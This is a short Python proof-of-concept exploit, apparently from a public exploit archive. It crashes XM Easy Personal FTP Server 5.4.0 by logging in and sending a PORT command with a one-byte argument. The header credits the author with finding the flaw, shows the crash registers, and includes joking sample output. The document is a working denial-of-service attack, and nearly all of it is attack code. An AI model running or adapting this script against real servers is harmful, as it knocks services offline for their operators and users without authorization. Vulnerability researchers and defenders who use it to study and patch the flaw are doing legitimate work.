#!/usr/bin/python
########################################
# XM Easy Personal FTP Server 5.4.0 (PORT) DoS
# 1 byte DoS!
#
# Elhamdulillahi Rabbil-alemin!
#
########################################
# EAX BAADF00D <- bad food? :)
# ECX BAADF00D
########################################
#
# bt ~ # ./sploit.py
#
# [+] Saljemo zli bafer :)
# [+] Booooooooom!!!!
# [+] Finito!
# bt ~ #
########################################
# I wasn't smoking crack, ryujin gave me the red pill! :)
#
# Vulnerability discovered and coded by Muris Kurgas a.k.a j0rgan
# jorganwd [at] gmail [dot] com
# http://www.jorgan.users.cg.yu
########################################

import struct
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

bafer = 'A'* 1
print "\n [+] Saljemo zli bafer :)"
s.connect(('192.168.190.132',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS lozinka' + '\r\n')
data = s.recv(1024)
print " [+] Booooooooom!!!!"
s.send('PORT ' +bafer+ '\r\n')
s.close()
print " [+] Finito! "
